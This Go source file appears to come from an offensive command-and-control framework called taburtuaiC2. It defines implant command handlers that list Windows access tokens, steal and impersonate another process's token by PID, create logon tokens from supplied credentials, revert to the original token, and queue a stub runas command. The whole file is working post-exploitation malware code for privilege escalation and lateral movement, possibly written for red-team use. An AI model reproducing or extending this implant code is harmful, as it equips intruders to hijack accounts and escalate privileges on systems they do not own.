package main

import (
	"fmt"

	agentexec "github.com/mjopsec/taburtuaiC2/implant/exec"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleTokenList(_ *types.Command, result *types.CommandResult) {
	infos, err := agentexec.ListTokens()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = agentexec.TokenListText(infos)
}

func handleTokenImpersonate(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenPID == 0 {
		result.Error = "token_steal/token_impersonate requires token_pid"
		result.ExitCode = 1
		return
	}
	user, err := agentexec.ImpersonateToken(cmd.TokenPID)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Impersonating %s (from PID %d)", user, cmd.TokenPID)
}

func handleTokenMake(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenUser == "" || cmd.TokenPass == "" {
		result.Error = "token_make requires token_user and token_pass"
		result.ExitCode = 1
		return
	}
	domain := cmd.TokenDomain
	if domain == "" {
		domain = "."
	}
	if err := agentexec.MakeToken(cmd.TokenUser, domain, cmd.TokenPass); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Token created for %s\\%s", domain, cmd.TokenUser)
}

func handleTokenRevert(_ *types.Command, result *types.CommandResult) {
	if err := agentexec.RevertToSelf(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Reverted to original token"
}

func handleTokenRunas(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenPID == 0 && (cmd.TokenUser == "" || cmd.TokenPass == "") {
		result.Error = "token_runas requires token_pid (steal) or token_user+token_pass (make)"
		result.ExitCode = 1
		return
	}
	if cmd.TokenExe == "" {
		result.Error = "token_runas requires token_exe"
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] RunAs %s queued (not yet implemented — use inject ppid for now)", cmd.TokenExe)
}
